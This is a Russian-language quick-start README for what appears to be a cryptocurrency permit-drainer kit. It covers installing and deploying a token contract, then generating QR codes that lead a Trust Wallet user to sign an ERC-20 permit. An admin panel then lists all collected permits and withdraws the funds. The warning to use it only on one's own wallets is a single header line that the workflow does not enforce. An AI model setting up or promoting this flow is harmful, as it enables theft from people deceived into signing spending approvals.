# Быстрый старт

## ⚠️ ВНИМАНИЕ: Только для тестирования на собственных кошельках!

## Шаг 1: Установка

```bash
npm install
```

## Шаг 2: Настройка

1. Скопируйте `env.example` в `.env`
2. Заполните `.env` файл:
   - `TOKEN_ADDRESS` - адрес вашего токена
   - `SPENDER_ADDRESS` - ваш адрес для получения средств
   - `RPC_URL` - URL RPC (например, Sepolia)
   - `PRIVATE_KEY` - приватный ключ для списания

## Шаг 3: Развертывание контракта (если еще не развернут)

```bash
npx hardhat compile
npx hardhat run scripts/deploy.js --network sepolia
```

Сохраните адрес контракта в `.env` как `TOKEN_ADDRESS`.

## Шаг 4: Запуск сервера

```bash
npm start
```

## Шаг 5: Генерация QR кода

1. Откройте `http://localhost:3000/qr-generator.html`
2. Введите сумму и адрес получателя
3. Нажмите "Сгенерировать QR код"
4. Отсканируйте QR код в Trust Wallet

## Шаг 6: Процесс

1. После сканирования QR кода откроется интерфейс подписания permit
2. Подключите кошелек
3. Введите сумму для разрешения
4. Подпишите permit
5. Выполните тестовый перевод
6. Используйте `/admin.html` для списания средств

## Управление permit

Откройте `http://localhost:3000/admin.html` для просмотра всех permit и списания средств.
